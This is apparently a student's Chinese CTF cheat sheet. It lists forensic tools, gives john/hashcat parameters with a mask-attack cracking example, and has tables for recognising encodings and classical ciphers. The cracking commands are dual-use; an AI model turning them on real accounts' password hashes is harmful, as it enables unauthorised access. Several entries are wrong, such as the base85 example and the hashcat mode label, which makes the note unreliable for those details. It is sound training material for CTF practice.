# 点击右上角三个线 outline 快速展开考点 ↗
大一大二的时候总结归纳的，现在转眼步入大四了，已经退役了，遂分享，知识点并不全，仅仅给小白快速入门看看，后续也会分享 WEB 知识点总结，文末也有笔者的一些感悟。
# <font style="color:rgb(51, 51, 51);">常用工具命令对照表</font>
| **<font style="color:rgb(51, 51, 51);">工具 / 命令名称</font>** | **<font style="color:rgb(51, 51, 51);">用途</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** | **<font style="color:rgb(51, 51, 51);">参数（常用）</font>** |
| --- | --- | --- | :--- |
| <font style="color:rgb(51, 51, 51);">trid</font> | <font style="color:rgb(51, 51, 51);">文件类型查询</font> | <font style="color:rgb(51, 51, 51);">trid.exe 输入文件路径</font> | |
| file | 文件类型查询 | file 输入文件路径 | |
| <font style="color:rgb(51, 51, 51);">xortool</font> | <font style="color:rgb(51, 51, 51);">文件异或爆破</font> | <font style="color:rgb(51, 51, 51);">python xortool.py 输入文件python xortool.py inputfile -l 1 -c 00</font> | <font style="color:rgb(51, 51, 51);">-l key长度</font><br/><font style="color:rgb(51, 51, 51);">-c 字符长度</font><br/><font style="color:rgb(51, 51, 51);">-m 字符最大长度</font><br/><font style="color:rgb(51, 51, 51);">-x 输入转为16进制</font><br/><font style="color:rgb(51, 51, 51);">-b 暴力破解所有可能项</font><br/><font style="color:rgb(51, 51, 51);">-o 暴力打印出所有可能项</font> |
| <font style="color:rgb(51, 51, 51);">010Editor</font> | <font style="color:rgb(51, 51, 51);">16进制编辑器</font> | | |
| <font style="color:rgb(51, 51, 51);">WinHex</font> | <font style="color:rgb(51, 51, 51);">16进制编辑器</font> | | |
| | | | |
| <font style="color:rgb(51, 51, 51);">binwalk</font> | <font style="color:rgb(51, 51, 51);">文件分离</font> | <font style="color:rgb(51, 51, 51);">binwalk 参数 输入文件binwalk -e inputfile --run-as=root</font> | <font style="color:rgb(51, 51, 51);">-e 文件分离</font><br/><font style="color:rgb(51, 51, 51);">-R 搜索字符串</font> |
| <font style="color:rgb(51, 51, 51);">foremost</font> | <font style="color:rgb(51, 51, 51);">文件分离</font> | <font style="color:rgb(51, 51, 51);">foremost 参数 输入文件foremost -i inputfile -T</font> | <font style="color:rgb(51, 51, 51);">-t 指定文件类型</font><br/><font style="color:rgb(51, 51, 51);">-i 指定输入文件路径</font><br/><font style="color:rgb(51, 51, 51);">-a 写入所有文件头部</font><br/><font style="color:rgb(51, 51, 51);">-o 指定输出目录</font><br/><font style="color:rgb(51, 51, 51);">-T 输出为当前时间名目录</font> |
| <font style="color:rgb(51, 51, 51);">strings</font> | <font style="color:rgb(51, 51, 51);">strings</font> | <font style="color:rgb(51, 51, 51);">strings 参数 输入文件strings inputfile</font> | <font style="color:rgb(51, 51, 51);">-a 扫描整个文件</font><br/><font style="color:rgb(51, 51, 51);">-d 打印已初始化数据</font><br/><font style="color:rgb(51, 51, 51);">-e（s,S,b，B，L）s 7bit S 8bit b,l 16bit B,L32bit 进行encoding进行编码</font><br/><font style="color:rgb(51, 51, 51);">-f显示字符前显示文件名 </font><br/><font style="color:rgb(51, 51, 51);">-t 字符串偏移位置-T 指定二进制格式 </font><br/><font style="color:rgb(51, 51, 51);">-v 显示版本信息</font><br/><font style="color:rgb(51, 51, 51);">-w默认情况下 显示空白字符</font> |




---

# <font style="color:rgb(51, 51, 51);">常见题型</font>
## <font style="color:rgb(51, 51, 51);">密码题总结</font>
### <font style="color:rgb(51, 51, 51);">密码工具</font>
| **<font style="color:rgb(51, 51, 51);">工具 / 命令名称</font>** | **<font style="color:rgb(51, 51, 51);">用途</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** | **<font style="color:rgb(51, 51, 51);">参数（常用）</font>** |
| :--- | :--- | --- | --- |
| <font style="color:rgb(51, 51, 51);">john</font> | <font style="color:rgb(51, 51, 51);">hash爆破</font> | 详细在附表中 |  |
| <font style="color:rgb(51, 51, 51);">hashcat</font> | <font style="color:rgb(51, 51, 51);">hash爆破</font> | 详细在附表中 |  |
| <font style="color:rgb(51, 51, 51);">ciphey</font> | <font style="color:rgb(51, 51, 51);">自动解码器</font> | | |
| <font style="color:rgb(51, 51, 51);">basecrack</font> | <font style="color:rgb(51, 51, 51);">base编码自动解码</font> | <font style="color:rgb(51, 51, 51);">python basecrack.py -b base-text</font> | <font style="color:rgb(51, 51, 51);">-b 传递单个base编码数据解码</font><br/><font style="color:rgb(51, 51, 51);">-f 传递多个base编码数据解码/文件</font><br/><font style="color:rgb(51, 51, 51);">-m 对任意模式的多重base编码数据解码</font><br/><font style="color:rgb(51, 51, 51);">-o 使用解码的base数据生成的字典输出</font> |
| <font style="color:rgb(51, 51, 51);">dcode.fr/cipher-identifier</font> | <font style="color:rgb(51, 51, 51);">杂项密码特征识别</font> | | |
| <font style="color:rgb(51, 51, 51);">cipherchef text-encoding-brust</font> | <font style="color:rgb(51, 51, 51);">特殊编码爆破</font> | | |
| <font style="color:rgb(51, 51, 51);">magic</font> | <font style="color:rgb(51, 51, 51);">特殊编码爆破</font> | | |
| <font style="color:rgb(51, 51, 51);">breakautokey</font> | <font style="color:rgb(51, 51, 51);">autokey爆破</font> | <font style="color:rgb(51, 51, 51);">修改python脚本内密文python breakautokey.py</font> | |
| <font style="color:rgb(51, 51, 51);">cyberchef</font> | <font style="color:rgb(51, 51, 51);">解码器</font> | | |
| <font style="color:rgb(51, 51, 51);">[随波逐流]CTF编码工具箱</font> | <font style="color:rgb(51, 51, 51);">解码器</font> | | |
| <font style="color:rgb(51, 51, 51);">ToolsFx</font> | <font style="color:rgb(51, 51, 51);">解码器</font> | | |
| <font style="color:rgb(51, 51, 51);">CTFcrack</font> | <font style="color:rgb(51, 51, 51);">解码器</font> | | |
| <font style="color:rgb(51, 51, 51);">logic</font> | <font style="color:rgb(51, 51, 51);">逻辑分析器</font> | | |
| <font style="color:rgb(51, 51, 51);">iconv</font> | <font style="color:rgb(51, 51, 51);">字符集转换</font> | <font style="color:rgb(51, 51, 51);">iconv -t 编码方式 密文iconv -f utf-8 -t type-7 text</font> | <font style="color:rgb(51, 51, 51);">将编码由-f 编码转为 -t 编码</font> |
| <font style="color:rgb(51, 51, 51);">010editor</font> | <font style="color:rgb(51, 51, 51);">字符集转换</font> | | |


### john/hashcat 工具参数
```plain
john
john hash文件
--single 简单爆破模式
--incremental 逐个遍历模式，遍历完所有可能
--show 显示已经破解的hash
--wordlist=字典 纯字典模式
--users=user 只破解指定用户的hash
--groups=user 只破解指定用户的hash
--shells=shell 只破解指定shell的hash

hashcat
hashcat 参数 字典
hashcat 参数 指定字符集 hash值hashcat -a3 hash值 abcde???? 字典文件
hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1

-a 0字典攻击 1 组合攻击 3 掩码攻击 6 Hybrid Wordlist + Mask字典+掩码破解7 Hybrid Mask + Wordlist掩码+字典破解l 纯小写字母u 纯大写字母d 纯数字h 十六进制小写字母和数字H 十六进制大写字母和数字s 特殊字符a 键盘上所有可见的字符b 空格
-m 指定破解的hash类型 例如5600指ntlm
-o 使用解密的hash 写入指定文件中--force 忽略破解时的警告
--show 显示已破解的hash
--increment 逐个遍历模式，遍历完所有可能
--increment-max
--increment-min--outfile-format 指定输出格式
--username 忽略用户名
--remove 删除已破解成功的hash
-r 使用自定义破解规则
-s 查看当前破解状态
-p 暂停
-r 继续
-q 退出破解
```

### <font style="color:rgb(51, 51, 51);">密码编码类型（类似16进制）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（类似16进制）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">16进制</font> | <font style="color:rgb(51, 51, 51);">68656C6C6F</font> | <font style="color:rgb(51, 51, 51);">数字，字母组成</font> |
| <font style="color:rgb(51, 51, 51);">Twin-Hex</font> | <font style="color:rgb(51, 51, 51);">239fg5g4f0b900</font> | <font style="color:rgb(51, 51, 51);">类似16进制，数字，字母组成</font> |
| <font style="color:rgb(51, 51, 51);">PDU</font> | <font style="color:rgb(51, 51, 51);">0291F111000191F10</font> | <font style="color:rgb(51, 51, 51);">类似16进制，数字，字母组成</font> |
| <font style="color:rgb(51, 51, 51);">type7</font> | <font style="color:rgb(51, 51, 51);">000C160A0854</font> | <font style="color:rgb(51, 51, 51);">类似16进制，数字，字母组成，需要纯数字种子值</font> |
| <font style="color:rgb(51, 51, 51);">base16</font> | <font style="color:rgb(51, 51, 51);">68656C6C6F776F7264</font> | <font style="color:rgb(51, 51, 51);">数字，大写字母组成</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（类似base 注：可换表）</font>
<font style="color:rgb(51, 51, 51);">| 密码编码类型（类似base64）</font>

| **<font style="color:rgb(51, 51, 51);">（注：可换表）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">base16</font> | <font style="color:rgb(51, 51, 51);">68656C6C6F776F7264</font> | <font style="color:rgb(51, 51, 51);">数字，大写字母组成</font> |
| <font style="color:rgb(51, 51, 51);">base32</font> | <font style="color:rgb(51, 51, 51);">NBSWY3DPEB3W64TMMQ======</font> | <font style="color:rgb(51, 51, 51);">数字，大写字母组成，末尾==</font> |
| <font style="color:rgb(51, 51, 51);">base58</font> | <font style="color:rgb(51, 51, 51);">6sBRWyxcbhCVD5</font> | <font style="color:rgb(51, 51, 51);">数字，大小写字母组成</font> |
| <font style="color:rgb(51, 51, 51);">base62</font> | <font style="color:rgb(51, 51, 51);">xoloNoNoZstoZs9oNoh</font> | <font style="color:rgb(51, 51, 51);">数字，大小写字母组成</font> |
| <font style="color:rgb(51, 51, 51);">base64</font> | <font style="color:rgb(51, 51, 51);">ZmxhZ3toZWxsb193b3JsZH0=</font> | <font style="color:rgb(51, 51, 51);">数字，大小写字母组成，末尾==</font> |
| <font style="color:rgb(51, 51, 51);">base85</font> | <font style="color:rgb(51, 51, 51);">aGV3b2VhZGFzZGFzZA==</font> | <font style="color:rgb(51, 51, 51);">数字，大小写字母组成</font> |
| <font style="color:rgb(51, 51, 51);">base91</font> | <font style="color:rgb(51, 51, 51);">Ao(mgHY?u,Ci<[)DfTZ)I/</font> | <font style="color:rgb(51, 51, 51);">乱码</font> |
| <font style="color:rgb(51, 51, 51);">base92</font> | <font style="color:rgb(51, 51, 51);">Fcsd#$#@21</font> | |
| <font style="color:rgb(51, 51, 51);">kKnsM*k</font> | <font style="color:rgb(51, 51, 51);">乱码</font> | |
| <font style="color:rgb(51, 51, 51);">base100</font> | **<font style="color:rgb(51, 51, 51);">😀</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😁</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😂</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">🤣</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😃</font>****<font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">😄</font>** | <font style="color:rgb(51, 51, 51);">emoji</font> |
| | | |
| <font style="color:rgb(51, 51, 51);">火狐登入凭证</font> | <font style="color:rgb(51, 51, 51);">AAAAAAAAAAAAiufidfdf/78fd==</font> | <font style="color:rgb(51, 51, 51);">类似base64，开头为AAAAA</font> |
| <font style="color:rgb(51, 51, 51);">serpent加密</font> | <font style="color:rgb(51, 51, 51);">gAKUfehWxai3MyVGwSwSC4uLZ9754uQUv4zAm7S5uDM=</font> | <font style="color:rgb(51, 51, 51);">类似base64，需要长度为16/24的key</font> |
| <font style="color:rgb(51, 51, 51);">XXencode</font> | <font style="color:rgb(51, 51, 51);">ANalVNrglAXAoBHNx++</font> | <font style="color:rgb(51, 51, 51);">类似base64，末尾++</font> |
| <font style="color:rgb(51, 51, 51);">炉石传说卡牌密码</font> | <font style="color:rgb(51, 51, 51);">iufidfdf/78fd==</font> | <font style="color:rgb(51, 51, 51);">类似base64</font> |
| | | |
| <font style="color:rgb(51, 51, 51);">AES加密（可更改模式，密钥可用16进制的00补齐，并非固定U2FsdGVk开头）</font> | <font style="color:rgb(51, 51, 51);">U2FsdGVk2Pfk/Umm6X7RJX3c=（</font> | <font style="color:rgb(51, 51, 51);">类似base64，需要key，可位移，开通头为U2FsdGVkX1/</font> |
| <font style="color:rgb(51, 51, 51);">DES加密（可更改模式，并非固定U2FsdGVk开头）</font> | <font style="color:rgb(51, 51, 51);">U2FsdGVkX1/7QUziyk8BujXBf=</font> | <font style="color:rgb(51, 51, 51);">类似base64，需要key，可位移，开通头为U2FsdGVkX1/</font> |
| <font style="color:rgb(51, 51, 51);">RC4加密（可更改模式，并非固定U2FsdGVk开头）</font> | <font style="color:rgb(51, 51, 51);">U2FsdGVkX19hDaCHrdmB+8ct0X/xSzQ==</font> | <font style="color:rgb(51, 51, 51);">类似base64，需要key，可位移，开通头为U2FsdGVkX1/</font> |
| <font style="color:rgb(51, 51, 51);">Rabbit加密（可更改模式，并非固定U2FsdGVk开头）</font> | <font style="color:rgb(51, 51, 51);">U2FsdGVkX1/e6VmpUSr0MJKS3AY=</font> | <font style="color:rgb(51, 51, 51);">类似base64，需要key，可位移，开通头为U2FsdGVkX1/</font> |
| <font style="color:rgb(51, 51, 51);">TripleDES（可更改模式，并非固定U2FsdGVk开头）</font> | <font style="color:rgb(51, 51, 51);">U2FsdGVkX1/e6VmpU+bKS3AY=</font> | <font style="color:rgb(51, 51, 51);">类似base64，需要key，可位移，开通头为U2FsdGVkX1/</font> |
| <font style="color:rgb(51, 51, 51);">bsae64隐写</font> | <font style="color:rgb(51, 51, 51);">bsd3==ad4g==</font> | <font style="color:rgb(51, 51, 51);">多行base64组合而成</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（类似url编码）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（类似url编码）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">敲击码</font> | <font style="color:rgb(51, 51, 51);">.... .. .... .. ... .. ..</font> | <font style="color:rgb(51, 51, 51);">. ，一种字符</font> |
| <font style="color:rgb(51, 51, 51);">摩斯密码</font> | <font style="color:rgb(51, 51, 51);">.-.--/..----/...--</font> | <font style="color:rgb(51, 51, 51);">.- 组成，两种字符</font> |
| <font style="color:rgb(51, 51, 51);">分组摩斯密码</font> | <font style="color:rgb(51, 51, 51);">----... .. .--. -....--</font> | <font style="color:rgb(51, 51, 51);">.- 组成，两种字符</font> |
| <font style="color:rgb(51, 51, 51);">培根密码</font> | <font style="color:rgb(51, 51, 51);">ABABBBBABBBA</font> | <font style="color:rgb(51, 51, 51);">AB组成，两种字符</font> |
| <font style="color:rgb(51, 51, 51);">A1Z26</font> | <font style="color:rgb(51, 51, 51);">-23-21-22-21-20</font> | <font style="color:rgb(51, 51, 51);">-数字-数字-数字A=1，B=2 ,,, Z=26</font> |
| <font style="color:rgb(51, 51, 51);">qutoed-printable</font> | <font style="color:rgb(51, 51, 51);">=65=66=67=69</font> | <font style="color:rgb(51, 51, 51);">=数字=数字=数字</font> |
| <font style="color:rgb(51, 51, 51);">shell编码</font> | <font style="color:rgb(51, 51, 51);">\x64\x68\x99\x56</font> | <font style="color:rgb(51, 51, 51);">\x数字\x数字\x数字</font> |
| <font style="color:rgb(51, 51, 51);">URL编码</font> | <font style="color:rgb(51, 51, 51);">%66%56%88%45</font> | <font style="color:rgb(51, 51, 51);">%数字%数字%数字</font> |
| <font style="color:rgb(51, 51, 51);">Escape/Unescape</font> | <font style="color:rgb(51, 51, 51);">%u0056%u0044%u0021</font> | <font style="color:rgb(51, 51, 51);">%u数字%u数字%u数字</font> |
| <font style="color:rgb(51, 51, 51);">HTML实体编码</font> | <font style="color:rgb(51, 51, 51);">@#34;@#22;@#56;</font> | <font style="color:rgb(51, 51, 51);">@#数字;@#数字;@#数字;</font> |
| | <font style="color:rgb(51, 51, 51);">!!!!</font> | <font style="color:rgb(51, 51, 51);">&#x数字;&#x数字;&#x数字;</font> |
| | <font style="color:rgb(51, 51, 51);">#x66;#x6c;#x61;</font> | <font style="color:rgb(51, 51, 51);">#x数字;#x数字;#x数字;</font> |
| <font style="color:rgb(51, 51, 51);">unicode</font> | <font style="color:rgb(51, 51, 51);">@#34;@#22;@#56;</font> | <font style="color:rgb(51, 51, 51);">@#数字;@#数字;@#数字;</font> |
| | <font style="color:rgb(51, 51, 51);">@#x55;@#x55;@#x32;</font> | <font style="color:rgb(51, 51, 51);">@#x数字;@#数字;@#x数字;</font> |
| | <font style="color:rgb(51, 51, 51);">\U0056\U0041\U0021</font> | <font style="color:rgb(51, 51, 51);">\U数字\U数字\U数字</font> |
| | <font style="color:rgb(51, 51, 51);">\U+0056\U+0021\U+0041</font> | <font style="color:rgb(51, 51, 51);">\U+数字\U+数字\U+数字</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（整串数字）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（整串数字）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">时间戳</font> | <font style="color:rgb(51, 51, 51);">11120203</font> | |
| <font style="color:rgb(51, 51, 51);">进制转换</font> | <font style="color:rgb(51, 51, 51);">1123 3345345 344</font> | <font style="color:rgb(51, 51, 51);">整串数字 / 多串数字</font> |
| <font style="color:rgb(51, 51, 51);">PT2242，PT2252</font> | <font style="color:rgb(51, 51, 51);">01010000001010</font> | <font style="color:rgb(51, 51, 51);">01组成，两种字符01代表F 00代表0 11代表1</font> |
| <font style="color:rgb(51, 51, 51);">二进制转整数（整数 long to bytes）原理为：int -> hex -> unhexlify</font> | <font style="color:rgb(51, 51, 51);">01010000001010</font> | <font style="color:rgb(51, 51, 51);">01组成</font> |
| <font style="color:rgb(51, 51, 51);">8421码 5421码 2421码</font> | <font style="color:rgb(51, 51, 51);">01010000001010</font> | <font style="color:rgb(51, 51, 51);">01组成</font> |
| <font style="color:rgb(51, 51, 51);">01248云影密码</font> | <font style="color:rgb(51, 51, 51);">012480248028</font> | <font style="color:rgb(51, 51, 51);">01248组成以0为分界线，片段内数字相加，对应1-26位字母表</font> |
| <font style="color:rgb(51, 51, 51);">ascii码加密</font> | <font style="color:rgb(51, 51, 51);">233312312312343</font> | |
| <font style="color:rgb(51, 51, 51);">多次hex编码</font> | <font style="color:rgb(51, 51, 51);">6464666693839</font> | <font style="color:rgb(51, 51, 51);">其16进制还是数字</font> |
| <font style="color:rgb(51, 51, 51);">超长整数（libnum.n2s）</font> | <font style="color:rgb(51, 51, 51);">12334344545453453451</font> | <font style="color:rgb(51, 51, 51);">长度很长的整数</font> |
| <font style="color:rgb(51, 51, 51);">超长整数（long to bytes）</font> | <font style="color:rgb(51, 51, 51);">12334344545453453451</font> | <font style="color:rgb(51, 51, 51);">长度很长的整数</font> |
| <font style="color:rgb(51, 51, 51);">tupper绘图函数</font> | <font style="color:rgb(51, 51, 51);">12336643543545786362698759</font> | <font style="color:rgb(51, 51, 51);">超级长的整数</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（多串数字）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（多串数字）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">16进制</font> | <font style="color:rgb(51, 51, 51);">1 12 2 23 3 34</font> | <font style="color:rgb(51, 51, 51);">整串数字 / 多串数字（个数范围1~16）</font> |
| <font style="color:rgb(51, 51, 51);">进制转换</font> | <font style="color:rgb(51, 51, 51);">1123 3345345 344</font> | <font style="color:rgb(51, 51, 51);">整串数字 / 多串数字</font> |
| <font style="color:rgb(51, 51, 51);">简单替换</font> | <font style="color:rgb(51, 51, 51);">00001 11000 00012 10102 11002</font> | <font style="color:rgb(51, 51, 51);">可替换成Ook brainfuck字符ook原理：01201 五个一组0-->. 1-->! 2-->?Ook --> text以每个符号为末尾，形成OokOok. Ook! Ook? Ook. Ook!</font><br/><br/>补充：<font style="color:#000000;background-color:#F3BB2F;">头部有 15 个 .</font> |
| <font style="color:rgb(51, 51, 51);">博多码</font> | <font style="color:rgb(51, 51, 51);">00100 00001 00111</font> | <font style="color:rgb(51, 51, 51);">01组成，单个片段长度为5</font> |
| <font style="color:rgb(51, 51, 51);">toy密码</font> | <font style="color:rgb(51, 51, 51);">0012 0012 0112 1111</font> | <font style="color:rgb(51, 51, 51);">012组成，单个片段长度为4</font> |
| <font style="color:rgb(51, 51, 51);">8进制</font> | <font style="color:rgb(51, 51, 51);">0123 0022 0213 00158</font> | <font style="color:rgb(51, 51, 51);">类似ascii码</font> |
| <font style="color:rgb(51, 51, 51);">棋盘密码</font> | <font style="color:rgb(51, 51, 51);">51 12 22 41</font> | <font style="color:rgb(51, 51, 51);">两数字一对，数字上限值为5</font> |
| <font style="color:rgb(51, 51, 51);">敲击码</font> | <font style="color:rgb(51, 51, 51);">52 21 22 23</font> | <font style="color:rgb(51, 51, 51);">两数字一对，数字上限值为5</font> |
| <font style="color:rgb(51, 51, 51);">格朗普雷密码</font> | <font style="color:rgb(51, 51, 51);">88 82 27 77</font> | <font style="color:rgb(51, 51, 51);">两数字一对，数字上限值为8</font> |
| <font style="color:rgb(51, 51, 51);">A1Z26</font> | <font style="color:rgb(51, 51, 51);">-23-21-22-21-20</font> | <font style="color:rgb(51, 51, 51);">-数字-数字-数字A=1，B=2 ,,, Z=26</font> |
| <font style="color:rgb(51, 51, 51);">qutoed-printable</font> | <font style="color:rgb(51, 51, 51);">=65=66=67=69</font> | <font style="color:rgb(51, 51, 51);">=数字=数字=数字</font> |
| <font style="color:rgb(51, 51, 51);">洛基亚键盘密码A</font> | <font style="color:rgb(51, 51, 51);">32 53 21</font> | <font style="color:rgb(51, 51, 51);">两数字一对</font> |
| <font style="color:rgb(51, 51, 51);">洛基亚键盘密码B</font> | <font style="color:rgb(51, 51, 51);">222 333 55 11</font> | <font style="color:rgb(51, 51, 51);">多个相同数字组成</font> |
| <font style="color:rgb(51, 51, 51);">键盘密码C</font> | <font style="color:rgb(51, 51, 51);">12,18,22,23</font> | <font style="color:rgb(51, 51, 51);">数字转换为键盘的键位QWERTYUIOP 11-18</font> |
| <font style="color:rgb(51, 51, 51);">ascii码</font> | <font style="color:rgb(51, 51, 51);">109 98 99 112</font> | <font style="color:rgb(51, 51, 51);">ascii码</font> |
| <font style="color:rgb(51, 51, 51);">ascii码-128</font> | <font style="color:rgb(51, 51, 51);">223 238 202 248</font> | <font style="color:rgb(51, 51, 51);">类似ascii码ascii码 - 128</font> |
| <font style="color:rgb(51, 51, 51);">比尔密码</font> | <font style="color:rgb(51, 51, 51);">317,2,92,73,112</font> | <font style="color:rgb(51, 51, 51);">类似ascii码</font> |
| <font style="color:rgb(51, 51, 51);">玻璃表四密码</font> | <font style="color:rgb(51, 51, 51);">213124 412 1345</font> | <font style="color:rgb(51, 51, 51);">多数字组成，数字上限值为8</font> |
| <font style="color:rgb(51, 51, 51);">TTL隐写</font> | <font style="color:rgb(51, 51, 51);">63 127 127 191 255</font> | <font style="color:rgb(51, 51, 51);">64，127，191，255组成TTL原理：将数字转为二进制，取前两位数字，重新拼凑出新的二进制，再转为ascii</font> |
| <font style="color:rgb(51, 51, 51);">Hamdycode</font> | <font style="color:rgb(51, 51, 51);">44 33 555 666 22</font> | <font style="color:rgb(51, 51, 51);">类似诺基亚键盘密码，多个相同数字组成</font> |
| <font style="color:rgb(51, 51, 51);">超长整数（n2s）</font> | <font style="color:rgb(51, 51, 51);">12334344545 453453451</font> | <font style="color:rgb(51, 51, 51);">长度很长的多整数</font> |
| <font style="color:rgb(51, 51, 51);">RGB三原色</font> | <font style="color:rgb(51, 51, 51);">(255,255,255)(0,0,0)</font> | <font style="color:rgb(51, 51, 51);">rgb三原色</font> |
| <font style="color:rgb(51, 51, 51);">元素周期表</font> | <font style="color:rgb(51, 51, 51);">9 2 11 21 23</font> | <font style="color:rgb(51, 51, 51);">以对应序列号的元素周期元素首字母</font> |
| <font style="color:rgb(51, 51, 51);">元素周期密码</font> | <font style="color:rgb(51, 51, 51);">52 41 11 12 99</font> | <font style="color:rgb(51, 51, 51);">多串数字组成，对应该元素的中文谐音</font> |
| <font style="color:rgb(51, 51, 51);">五笔输入法</font> | <font style="color:rgb(51, 51, 51);">0123 2212 2314</font> | <font style="color:rgb(51, 51, 51);">多串数字组成</font> |
| <font style="color:rgb(51, 51, 51);">中文电码</font> | <font style="color:rgb(51, 51, 51);">2755 0031 2974 2945</font> | <font style="color:rgb(51, 51, 51);">多串数字组成，单个片段长度为4</font> |
| <font style="color:rgb(51, 51, 51);">中文四角号码</font> | <font style="color:rgb(51, 51, 51);">2729 47447</font> | <font style="color:rgb(51, 51, 51);">多串数字组成，单个片段长度为5</font> |
| <font style="color:rgb(51, 51, 51);">Gronsfled</font> | <font style="color:rgb(51, 51, 51);">ISDASDASDSA11 12 32 43</font> | <font style="color:rgb(51, 51, 51);">密文为英文，密码为多串数字from pycipher import Gronsfeldprint(Gronsfeld([1,50,61,8,9,20,63,41]).decipher("TGLBOMSJNSRAJAZDEZXGHSJNZWHG"))# SICTFSHUMUISAGOODBOYYYYYYYYY</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（整串英文）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（整串英文）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">键盘密码</font> | <font style="color:rgb(51, 51, 51);">LOIUJMYTYRFV</font> | <font style="color:rgb(51, 51, 51);">整串英文组成</font> |
| <font style="color:rgb(51, 51, 51);">恩尼格玛密码</font> | <font style="color:rgb(51, 51, 51);">OLCVSETZZ</font> | <font style="color:rgb(51, 51, 51);">整串英文组成</font> |
| <font style="color:rgb(51, 51, 51);">四方密码</font> | <font style="color:rgb(51, 51, 51);">THBCVEAHGNGVNN</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，需要两个字母表（密钥方块）</font> |
| <font style="color:rgb(51, 51, 51);">自动钥匙密码Autokey</font> | <font style="color:rgb(51, 51, 51);">ulsydscothoxsh</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，需要key</font> |
| <font style="color:rgb(51, 51, 51);">滚动钥匙密码</font> | <font style="color:rgb(51, 51, 51);">oiwwcokfco</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，需要key</font> |
| <font style="color:rgb(51, 51, 51);">希尔密码</font> | <font style="color:rgb(51, 51, 51);">pltpfnplkvrfqbnc</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，需要4个整数key</font> |
| <font style="color:rgb(51, 51, 51);">普莱菲尔密码</font> | <font style="color:rgb(51, 51, 51);">LUNBAKSS</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要key</font> |
| <font style="color:rgb(51, 51, 51);">porta密码</font> | <font style="color:rgb(51, 51, 51);">ztxubepz</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要key（矩阵类似维吉尼亚密码表）</font> |
| <font style="color:rgb(51, 51, 51);">双密码</font> | <font style="color:rgb(51, 51, 51);">HBDSADXCX</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，矩阵密码，需要长度为25的字母表key，以及一个整数key</font> |
| <font style="color:rgb(51, 51, 51);">列位移密码</font> | <font style="color:rgb(51, 51, 51);">llefolagh</font> | <font style="color:rgb(51, 51, 51);">整串英文组成，以回路排列，可填充大量字符，需要key</font> |


### <font style="color:rgb(51, 51, 51);">密码编码类型（多串英文）</font>
| **<font style="color:rgb(51, 51, 51);">密码编码类型（多串英文）</font>** | **<font style="color:rgb(51, 51, 51);">示例</font>** | **<font style="color:rgb(51, 51, 51);">特征</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">键盘密码</font> | <font style="color:rgb(51, 51, 51);">LOIUJM YTYRFV</font> | <font style="color:rgb(51, 51, 51);">多串英文组成</font> |
| <font style="color:rgb(51, 51, 51);">Gronsfeld密码</font> | <font style="color:rgb(51, 51, 51);">kpmtpw zqsl</font> | <font style="color:rgb(51, 51, 51);">多串英文组成，需要一个整数key</font> |
| <font style="color:rgb(51, 51, 51);">Digrafid密码</font> | <font style="color:rgb(51, 51, 51);">Hx Di Bm Cn</font> | <font style="color:rgb(51, 51, 51);">两大小写英文一对，多串英文组成</font> |
| <font style="color:rgb(51, 51, 51);">ADFGX/ADFGVX</font> | <font style="color:rgb(51, 51, 51);">ADFX GAVX AGFX</font> | <font style="color:rgb(51, 51, 51);">ADFGVX组成，矩阵密码</font> |
| <font style="color:rgb(51, 51, 51);">Toy密码</font> | <font style="color:rgb(51, 51, 51);">ACEG ADEG AEDH</font> | <font style="color:rgb(51, 51, 51);">多串英文组成，矩阵密码</font> |
| <font style="color:rgb(51, 51, 51);">Bazeries密码</font> | <font style="color:rgb(51, 51, 51);">TE EQU ICK BRO</font> | <font style="color:rgb(51, 51, 51);">多串英文组成，需要字母矩阵以及随机数字</font> |
| <font style="color:rgb(51, 51, 51);">BubbleBabble</font> | <font style="color:rgb(51, 51, 51);">swds-asd-dasx-cx</font> | <font style="color:rgb(51, 51, 51);">英文-英文-英文</font> |
